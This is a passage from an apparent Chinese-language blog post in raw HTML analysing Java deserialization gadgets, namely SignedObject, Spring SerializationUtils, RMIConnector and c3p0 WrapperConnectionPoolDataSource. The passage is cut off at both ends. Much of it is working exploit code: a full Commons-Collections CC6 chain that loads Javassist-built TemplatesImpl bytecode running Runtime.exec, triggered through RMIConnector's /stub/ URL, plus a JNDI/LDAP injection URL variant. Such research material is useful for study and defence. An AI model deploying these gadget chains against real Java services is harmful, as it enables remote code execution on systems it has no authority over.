class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey,</span><br><span class="hljs-params">                        Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>            <span class="hljs-comment">// creating a stream pipe-line, from a to b</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>            <span class="hljs-comment">// write and flush the object content to byte array</span><br>            a.writeObject(object);<br>            a.flush();<br>            a.close();<br>            <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>            b.close();<br><br>            <span class="hljs-comment">// now sign the encapsulated object</span><br>            <span class="hljs-built_in">this</span>.sign(signingKey, signingEngine);<br>    &#125;<br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>        b.close();<br>        a.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>触发方式：能够执行类的<code>getter</code>方法，比如配合<code>ROME</code>或<code>FastJson</code>打：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(object_with_evil_readObject, privateKey, signingEngine);<br></code></pre></td></tr></table></figure><h2 id="SerializationUtils"><a href="#SerializationUtils" class="headerlink" title="SerializationUtils"></a>SerializationUtils</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.util.SerializationUtils.deserialize<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> <span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>    <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125; <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.remote.rmi.RMIConnector#findRMIServerJRMP<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJRMP</span><span class="hljs-params">(String base64, Map&lt;String, ?&gt; env, <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serialized = base64ToByteArray(base64);<br>    &#125; <span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> EnvHelp.resolveClientClassLoader(env);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">oin</span> <span class="hljs-operator">=</span><br>        (loader == <span class="hljs-literal">null</span>) ?<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bin) :<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStreamWithLoader</span>(bin, loader);<br>    <span class="hljs-keyword">final</span> Object stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = oin.readObject();<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>若能控制base64参数的内容就可以任意反序列化。</p><p>往上回溯：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServer</span><span class="hljs-params">(JMXServiceURL directoryURL,</span><br><span class="hljs-params">                                Map&lt;String, Object&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isIiop</span> <span class="hljs-operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (isIiop) &#123;<br>        <span class="hljs-comment">// Make sure java.naming.corba.orb is in the Map.</span><br>        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> directoryURL.getURLPath();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> path.indexOf(<span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (end &lt; <span class="hljs-number">0</span>) end = path.length();<br>    <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/jndi/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJNDI(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/stub/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJRMP(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/ior/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!IIOPHelper.isAvailable())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;iiop protocol not available&quot;</span>);<br>        <span class="hljs-keyword">return</span> findRMIServerIIOP(path.substring(<span class="hljs-number">5</span>,end), environment, isIiop);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +<br>            <span class="hljs-string">&quot;or /ior/: &quot;</span> + path;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MalformedURLException</span>(msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>path</code>以<code>/stub/</code>开头就能进到<code>findRMIServerJRMP</code>，<code>path</code>中<code>/stub/</code>为序列化字节的base64编码</p><p><code>path</code>由<code>directoryURL#getURLPath</code>得到</p><p>在往上发现<code>connect</code>和<code>doStart</code>调用了<code>findRMIServer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        connect(<span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(Map&lt;String,?&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">tracing</span> <span class="hljs-operator">=</span> logger.traceOn();<br>    <span class="hljs-type">String</span>        <span class="hljs-variable">idstr</span>   <span class="hljs-operator">=</span> (tracing?<span class="hljs-string">&quot;[&quot;</span>+<span class="hljs-built_in">this</span>.toString()+<span class="hljs-string">&quot;]&quot;</span>:<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (terminated) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already closed.&quot;</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Connector closed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (connected) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already connected.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; usemap =<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;((<span class="hljs-built_in">this</span>.env==<span class="hljs-literal">null</span>) ?<br>                                        Collections.&lt;String, Object&gt;emptyMap() : <span class="hljs-built_in">this</span>.env);<br><br>        <span class="hljs-keyword">if</span> (environment != <span class="hljs-literal">null</span>) &#123;<br>            EnvHelp.checkAttributes(environment);<br>            usemap.putAll(environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>        <span class="hljs-keyword">if</span> (tracing) logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; finding stub...&quot;</span>);<br>        <span class="hljs-type">RMIServer</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, usemap);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doStart</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>    RMIServer stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, env);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用CC链的<code>InvokerTransformer</code>来触发<code>connect</code>（<code>doStart</code>被<code>protected</code>修饰，不能用<code>InvokerTransformer</code>触发）：</p><p>以CC6为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIConnectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/stub/&quot;</span> + getCode()), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">invokeTransformer</span> <span class="hljs-operator">=</span> InvokerTransformer.getInstance(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, constantTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// 将真正的transformers数组设置进来</span><br>        setValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokeTransformer);<br>        setValue(entry,<span class="hljs-string">&quot;key&quot;</span>, rmiConnector);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>findRMIServerJRMP</code>支持<code>jndi</code>、<code>stub</code>、<code>iiop</code></p><p>跟进<code>path</code>以<code>/jndi/</code>开头的分支：<code>findRMIServerJNDI</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJNDI</span><span class="hljs-params">(String jndiURL, Map&lt;String, ?&gt; env,</span><br><span class="hljs-params">                                    <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(EnvHelp.mapToHashtable(env));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">objref</span> <span class="hljs-operator">=</span> ctx.lookup(jndiURL);<br>    ctx.close();<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>熟悉的<code>InitialContext#lookup</code>，改一下<code>path</code>就可以<code>jndi</code>注入了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/jndi/ldap://127.0.0.1:8099/aaa&quot;</span> )<br></code></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p><code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setuserOverridesAsString</code>可以跟进到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">C3P0ImplUtils#parseUserOverridesAsString<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">HASM_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">parseUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span>&#123; <br>    <span class="hljs-keyword">if</span> (userOverridesAsString != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="hljs-number">1</span>, userOverridesAsString.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );<br>        <span class="hljs-keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> Collections.EMPTY_MAP;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里字符截取是从<code>HASM_HEADER.length() + 1</code>到<code>userOverridesAsString.length() - 1</code>，最后一位会吃掉</p><figure class="highlight java"><table><tr><td 